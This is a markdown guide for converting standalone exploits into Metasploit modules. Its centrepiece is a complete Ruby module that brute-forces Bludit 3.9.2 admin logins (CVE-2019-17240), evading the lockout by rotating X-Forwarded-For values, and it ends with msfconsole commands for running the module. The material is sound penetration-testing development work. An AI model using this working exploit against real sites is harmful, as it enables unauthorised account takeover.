

## Goal

Convert standalone exploits (Python, PHP, etc.) into first-class Metasploit modules.

## Ground Rules

- Metasploit modules are Ruby and use **hard tabs**, not spaces.
    
- Follow MSF module architecture (class, mixins, metadata, options, actions).
    
- Prefer **local module tree** over system paths.
    

---

## Directory Layout (use local dev tree)

```
~/.msf4/modules/
  exploits/
    linux/http/
    windows/smb/
  auxiliary/
  post/
```

Place your module here so `reload_all` picks it up without system-wide writes.

---

## Workflow (Fast)

1. Find a similar module, copy its skeleton.
    
2. Identify transport (HTTP, SMB, FTP, etc.) → choose correct **mixins**.
    
3. Fill in metadata, references, targets, options.
    
4. Port core exploit logic (request crafting, parsing, trigger).
    
5. Implement `check` and `exploit`. Add `report_*` calls.
    
6. Validate with `msftidy.rb`, test in msfconsole, iterate.
    

---

## Useful Mixins (pick what fits)

- HTTP: `include Msf::Exploit::Remote::HttpClient`
    
- TCP: `include Msf::Exploit::Remote::Tcp`
    
- SMB: `include Msf::Exploit::Remote::SMB::Client`
    
- File upload helpers: often within protocol mixins
    
- Brute-force helpers: `Msf::Auxiliary::Scanner`, `Msf::Auxiliary::Report`
    

Search similar modules for exact mixins to reuse.

---

## Minimal Exploit Skeleton (HTTP example – tabs required)

```ruby
##
# This module requires Metasploit: https://metasploit.com/
##

class MetasploitModule < Msf::Exploit::Remote
	include Msf::Exploit::Remote::HttpClient

	Rank = NormalRanking

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Bludit 3.9.2 Auth Bruteforce Mitigation Bypass',
			'Description'    => %q{
				Bludit ≤ 3.9.2 allows bypass of brute-force mitigation via X-Forwarded-For.
			},
			'Author'         => [
				'rastating',     # discovery
				'0ne-nine9'      # MSF module
			],
			'References'     => [
				[ 'CVE', '2019-17240' ],
				[ 'URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/' ],
				[ 'URL', 'https://github.com/bludit/bludit/pull/1090' ]
			],
			'License'        => MSF_LICENSE,
			'Platform'       => [ 'linux' ],
			'Arch'           => ARCH_GENERIC,
			'Targets'        => [
				[ 'Automatic', { } ]
			],
			'DefaultTarget'  => 0,
			'DisclosureDate' => '2019-10-06'
		))

		register_options(
			[
				OptString.new('TARGETURI', [ true, 'Base path', '/' ]),
				OptString.new('BLUDITUSER', [ true, 'Bludit username', 'admin' ]),
				OptPath.new('PASSWORDS', [ true, 'Password list',
					File.join(Msf::Config.data_directory, 'wordlists', 'passwords.txt')
				])
			]
		)
	end

	def check
		res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'admin', 'login'))
		return Exploit::CheckCode::Detected if res && res.code == 200 && res.body.include?('tokenCSRF')
		Exploit::CheckCode::Unknown
	end

	def get_csrf(login_uri)
		res = send_request_cgi('uri' => login_uri)
		fail_with(Failure::UnexpectedReply, 'No login page') unless res && res.code == 200
		m = res.body.match(/name="tokenCSRF".+?value="([^"]+)"/)
		fail_with(Failure::UnexpectedReply, 'No CSRF token') unless m
		m[1]
	end

	def auth_ok?(res)
		return false unless res
		return true if res.redirection? && res.headers['Location'].to_s.include?('/admin/dashboard')
		false
	end

	def bruteforce(login_uri, user, wordlist)
		File.foreach(wordlist).with_index do |pw, i|
			pw = pw.strip
			token = get_csrf(login_uri)
			vprint_status("Trying: #{pw}")
			res = send_request_cgi(
				'method'  => 'POST',
				'uri'     => login_uri,
				'headers' => { 'X-Forwarded-For' => "#{i}-#{pw[0,5]}" },
				'vars_post' => {
					'tokenCSRF' => token,
					'username'  => user,
					'password'  => pw
				}
			)
			if auth_ok?(res)
				print_good("Password found: #{pw}")
				report_cred(
					ip: rhost,
					port: rport,
					service_name: 'http',
					user: user,
					password: pw,
					proof: 'Bludit dashboard redirect',
					private_type: :password
				)
				return pw
			end
		end
		nil
	end

	def exploit
		login_uri = normalize_uri(target_uri.path, 'admin', 'login')
		user = datastore['BLUDITUSER']
		pwfile = datastore['PASSWORDS']
		pass = bruteforce(login_uri, user, pwfile)
		fail_with(Failure::NoTarget, 'No valid password found') unless pass
		print_status("Authenticated as #{user}. Next step: module chaining (e.g., upload RCE) or session creation.")
	end
end
```

---

## Porting Notes (Bludit case)

- Reuse structure from:  
    `/usr/share/metasploit-framework/modules/exploits/linux/http/bludit_upload_images_exec.rb`
    
- Save new module as:  
    `~/.msf4/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb`
    
- Core logic: request login page, parse `tokenCSRF`, post creds with rotating `X-Forwarded-For`, detect redirect to `/admin/dashboard`.
    

---

## Options Block (recap)

```ruby
register_options(
  [
    OptString.new('TARGETURI', [true, 'Base path', '/']),
    OptString.new('BLUDITUSER', [true, 'Username']),
    OptPath.new('PASSWORDS', [true, 'Wordlist',
      File.join(Msf::Config.data_directory, 'wordlists', 'passwords.txt')])
  ]
)
```

---

## msfconsole Dev Loop

```
msfconsole -q
reload_all
search bludit
use exploit/linux/http/bludit_auth_bruteforce_mitigation_bypass
set RHOSTS 10.10.10.10
set TARGETURI /
set BLUDITUSER admin
set PASSWORDS /path/to/wordlist.txt
run
```

---

## Quality Gates

- Syntax/style: `tools/dev/msftidy.rb <path_to_module>`
    
- Keep tabs hard. Avoid trailing spaces.
    
- Add `check` method where possible (returns `CheckCode::*`).
    
- Use `report_*` helpers (`report_cred`, `store_loot`, etc.).
    
- Add `Notes`, `References`, `DisclosureDate`, `DefaultOptions` if applicable.
    
- Targets block if RCE path differs by version.
    

---

## Organization Tips

- Snake case filenames: `bludit_auth_bypass.rb`
    
- Keep custom modules grouped by vendor/service.
    
- Maintain a CHANGELOG header comment with date and changes.
    

---

## Mapping Non-MSF Exploits to MSF

- Input parsing → `register_options`
    
- HTTP requests → `send_request_cgi` (cookies, headers, redirects handled)
    
- Output detection → pattern match, status codes, redirects
    
- State handling → instance vars and datastore
    
- Chaining post-auth to RCE → call a second module or embed steps
    

---

## Testing

- Use a sandbox VM with the exact target version.
    
- Verify idempotency (re-running does not break target state).
    
- Add `vprint_*` for noisy debug, `print_*` for key events.
    
- Timeouts and retries for network-flaky targets.
    

---

## References

- Rapid7 Metasploit RubyDoc (module/mixins APIs)
    
- Existing modules under `modules/exploits/*` for patterns
    
- `msftidy.rb` for pre-merge hygiene checks
    

---

## One-Screen Checklist

-  Skeleton copied from similar module
    
-  Correct mixins included
    
-  Metadata, references, disclosure date set
    
-  Options registered
    
-  `check` implemented
    
-  Core exploit logic ported and idempotent
    
-  Creds/loot reporting in place
    
-  `msftidy.rb` clean
    
-  Tested via `reload_all` and live target VM